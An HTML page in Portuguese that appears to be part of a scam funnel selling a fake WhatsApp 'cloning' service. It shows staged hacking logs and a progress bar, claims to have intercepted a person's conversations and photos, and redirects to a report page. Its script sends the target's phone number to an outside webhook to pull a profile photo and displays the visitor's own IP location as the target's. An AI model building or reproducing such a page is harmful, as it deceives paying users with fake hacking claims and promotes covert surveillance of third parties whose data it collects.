<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp - Processando...</title>

    <script
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        data-utmify-prevent-xcod-sck
        data-utmify-prevent-subids
        async
        defer
    ></script>

    <script>
        window.pixelId = "67fc2ba806eb140157116830";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);
    </script>
    <style>
        :root {
            --primary-green: #25D366;
            --dark-green: #128C7E;
            --bg-color: #f0f2f5;
            --white: #ffffff;
            --text-main: #111b21;
            --text-sec: #667781;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* HEADER */
        header {
            background-color: var(--bg-color);
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #e9edef;
        }
        
        .logo svg { height: 28px; }
        .icon-btn svg { width: 24px; height: 24px; fill: var(--text-sec); }

        /* CONTAINER PRINCIPAL */
        .main-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
        }

        h1.title {
            font-size: 20px;
            color: var(--text-main);
            margin-bottom: 10px;
            font-weight: 600;
            text-align: center;
        }

        p.subtitle {
            font-size: 14px;
            color: var(--text-sec);
            text-align: center;
            margin-bottom: 30px;
        }

        /* CARD DE CARREGAMENTO */
        .card {
            background: var(--white);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            width: 100%;
            text-align: center;
            transition: all 0.3s ease;
        }

        /* ANIMAÇÃO DE SPINNER */
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(37, 211, 102, 0.2);
            border-left-color: var(--primary-green);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* BARRA DE PROGRESSO */
        .progress-wrapper {
            background: #e9edef;
            height: 8px;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 10px;
        }
        .progress-bar {
            height: 100%;
            background: var(--primary-green);
            width: 0%;
            transition: width 0.3s ease;
        }
        .progress-status {
            font-size: 13px;
            color: var(--text-sec);
            margin-bottom: 20px;
        }

        /* LOGS DE CONEXÃO */
        .log-box {
            background: #f0f2f5;
            border-radius: 8px;
            padding: 10px;
            height: 150px;
            overflow-y: auto;
            text-align: left;
            font-size: 12px;
            font-family: monospace;
            border: 1px solid #e0e0e0;
        }
        .log-item {
            margin-bottom: 5px;
            opacity: 0;
            transform: translateY(5px);
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .log-item.show { opacity: 1; transform: translateY(0); }
        .log-item svg { width: 12px; height: 12px; flex-shrink: 0; }
        .log-success { color: #0f9d58; }
        .log-warning { color: #f4b400; }

        /* PERFIL ENCONTRADO (Escondido inicialmente) */
        .profile-wrapper {
            display: none; /* JS vai mudar para flex */
            flex-direction: column;
            align-items: center;
            width: 100%;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .avatar-box {
            position: relative;
            margin-bottom: 15px;
        }
        .avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid var(--primary-green);
            padding: 2px;
            background: #fff;
        }
        .status-badge {
            position: absolute;
            bottom: 5px;
            right: 5px;
            background: #25D366;
            width: 18px;
            height: 18px;
            border-radius: 50%;
            border: 2px solid #fff;
        }

        .profile-name { font-size: 18px; font-weight: 700; color: var(--text-main); }
        .profile-phone { font-size: 14px; color: var(--text-sec); margin-bottom: 20px; }

        .data-row {
            display: flex;
            justify-content: space-between;
            width: 100%;
            padding: 12px 0;
            border-bottom: 1px solid #f0f0f0;
            font-size: 14px;
        }
        .data-row:last-of-type { border-bottom: none; margin-bottom: 20px; }
        .data-label { color: var(--text-sec); }
        .data-value { font-weight: 600; color: var(--text-main); }

        .btn-access {
            background-color: var(--primary-green);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(37, 211, 102, 0.3);
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: transform 0.2s;
        }
        .btn-access:hover { transform: scale(1.02); background-color: var(--dark-green); }
        
        /* Footer */
        footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #999;
            margin-top: auto;
        }
    </style>
</head>
<body>

    <header>
        <div class="icon-btn">
            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
        </div>
        <div class="logo">
            <svg viewBox="0 0 33 33" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:35px;">
                <path d="M16.6 0C7.4 0 0 7.4 0 16.5C0 19.5 0.8 22.3 2.2 24.8L0 33L8.4 30.8C10.8 32.1 13.6 32.9 16.6 32.9C25.7 32.9 33.1 25.5 33.1 16.4C33.1 7.3 25.7 0 16.6 0Z" fill="#25D366"/>
                <path d="M25.7 21.6C25.5 22.9 24.3 23.9 23.1 24.2C22.2 24.4 17.8 26.2 12.1 20.6C6.9 15.3 8.3 11.2 8.7 10.3C9 9.1 10.1 7.9 11.4 7.7C11.6 7.6 11.9 7.6 12.2 7.6C12.5 7.6 12.8 7.7 13 8.3C13.3 9 14 10.7 14.1 10.9C14.2 11.1 14.3 11.4 14.1 11.7C13.9 12 13.8 12.1 13.5 12.4C13.3 12.7 13 12.9 13.3 13.4C13.6 13.9 14.7 15.7 16.3 17.1C17.9 18.5 19.3 19 19.8 19.2C20.3 19.4 20.6 19.4 20.9 19.1C21.2 18.8 21.7 18.1 21.9 17.7C22.2 17.3 22.5 17.4 22.8 17.5C23.1 17.6 24.8 18.5 25.1 18.6C25.5 18.8 25.7 18.9 25.8 19.1C25.9 19.2 25.9 20.4 25.7 21.6Z" fill="white"/>
            </svg>
        </div>
        <div class="icon-btn">
            <svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
        </div>
    </header>

    <div class="main-container">
        <div id="loadingStep" class="card">
            <h1 class="title">Conectando...</h1>
            <p class="subtitle">Estabelecendo conexão segura com o servidor.</p>
            
            <div class="spinner"></div>
            
            <div class="progress-wrapper">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="progress-status" id="progressStatus">Iniciando protocolo... 0%</div>

            <div class="log-box" id="logBox">
                </div>
        </div>

        <div id="profileStep" class="card profile-wrapper">
            <h1 class="title" style="color:#0f9d58;">Acesso Concedido!</h1>
            <p class="subtitle">Conseguimos interceptar os dados com sucesso.</p>

            <div class="avatar-box">
                <img id="userAvatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ccc'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" class="avatar">
                <div class="status-badge"></div>
            </div>

            <div class="profile-name" id="userName">Usuário WhatsApp</div>
            <div class="profile-phone" id="userPhone">(XX) XXXXX-XXXX</div>

            <div class="data-row">
                <span class="data-label">Status:</span>
                <span class="data-value" style="color: #25D366;">Online</span>
            </div>
            <div class="data-row">
                <span class="data-label">Localização:</span>
                <span class="data-value" id="locationData">Brasil</span>
            </div>
            <div class="data-row">
                <span class="data-label">Mídia Recente:</span>
                <span class="data-value">14 Fotos / 3 Vídeos</span>
            </div>

            <button onclick="redirectToReport()" class="btn-access">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                VER CONVERSAS E FOTOS
            </button>
        </div>
    </div>

    <footer>
        <p>Sistema Seguro & Criptografado &copy; 2025</p>
    </footer>

    <script>
        // === 1. CONFIGURAÇÕES INICIAIS ===
        const logs = [
            "Conectando ao servidor...",
            "Validando número de telefone...",
            "Buscando chave de criptografia...",
            "Chave encontrada! Descriptografando...",
            "Acessando banco de dados de mídia...",
            "Baixando histórico de conversas...",
            "Fotos recentes encontradas...",
            "Finalizando conexão segura...",
            "Sucesso! Dados prontos para visualização."
        ];

        // Recupera o número salvo
        const numeroSalvo = localStorage.getItem('numeroClonado') || '(11) 99999-9999';
        
        // Exibe o número formatado
        document.getElementById('userPhone').innerText = numeroSalvo;

        // === 2. FUNÇÃO DE REDIRECIONAMENTO COM UTMS ===
        function redirectToReport() {
            const currentUrl = new URL(window.location.href);
            const params = currentUrl.search; // Pega ?utm_source=...
            
            // Redireciona para a pasta 'relatorio' mantendo os parâmetros
            window.location.href = `/relatorio/index.html${params}`;
        }

        // === 3. SIMULAÇÃO DE PROGRESSO E LOGS ===
        let progress = 0;
        const progressBar = document.getElementById('progressBar');
        const progressStatus = document.getElementById('progressStatus');
        const logBox = document.getElementById('logBox');
        
        function addLog(text, type = 'normal') {
            const div = document.createElement('div');
            div.className = `log-item ${type === 'success' ? 'log-success' : ''}`;
            if(type === 'warning') div.className += ' log-warning';
            
            // Ícone SVG simples
            let iconPath = '<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-2h2v2h-2zm0-10v6h2V7h-2z"/>'; // Info
            if(type === 'success') iconPath = '<path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>'; // Check
            if(type === 'warning') iconPath = '<path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>'; // Alert

            div.innerHTML = `<svg viewBox="0 0 24 24" fill="currentColor">${iconPath}</svg> ${text}`;
            logBox.appendChild(div);
            
            // Animação de entrada e scroll
            setTimeout(() => div.classList.add('show'), 50);
            logBox.scrollTop = logBox.scrollHeight;
        }

        const interval = setInterval(() => {
            progress += Math.floor(Math.random() * 5) + 1;
            if (progress > 100) progress = 100;

            progressBar.style.width = `${progress}%`;
            progressStatus.innerText = `Processando... ${progress}%`;

            // Adiciona logs baseados no progresso
            const logIndex = Math.floor((progress / 100) * logs.length);
            if (logIndex < logs.length && Math.random() > 0.7) {
                addLog(logs[logIndex]);
            }

            if (progress === 100) {
                clearInterval(interval);
                addLog("Processo concluído!", "success");
                setTimeout(showProfile, 1000);
            }
        }, 150); // Velocidade do carregamento

        // === 4. BUSCA DE DADOS (API PROTEGIDA) ===
        function showProfile() {
            document.getElementById('loadingStep').style.display = 'none';
            document.getElementById('profileStep').style.display = 'flex';
            
            // Tenta buscar a foto real, se falhar, usa a padrão
            fetchProfileData();
        }

        async function fetchProfileData() {
            // Se o número não tiver DDI (55), adiciona
            let cleanNum = numeroSalvo.replace(/\D/g, '');
            if(cleanNum.length <= 11) cleanNum = '55' + cleanNum;

            try {
                const response = await fetch("https://w.imagens.pics/webhook/182dd", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "key": "wuAsuKHImXennBSFjt895tu984ut5"
                    },
                    body: JSON.stringify({ number: cleanNum })
                });

                if (response.ok) {
                    const data = await response.json();
                    if (data.foto) {
                        document.getElementById('userAvatar').src = data.foto;
                    }
                }
            } catch (e) {
                console.log("Erro na API, usando perfil genérico.");
            }
        }

        // === 5. LOCALIZAÇÃO PRECISA (ATUALIZADO PARA IPAPI) ===
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const city = data.city || "São Paulo";
                const region = data.region_code || "SP";
                const country = data.country_name || "Brasil";
                const locationText = `${city} - ${region}`;

                // Atualiza perfil e dados
                document.getElementById('locationData').innerText = locationText;

                // Log de segurança (aparece aos 14s)
                setTimeout(() => {
                    addLog(`Conexão detectada em ${city} - ${region}, ${country}`, 'warning');
                }, 14000);
            })
            .catch(() => {
                document.getElementById('locationData').innerText = "Brasil";
            });

    </script>
</body>
</html>
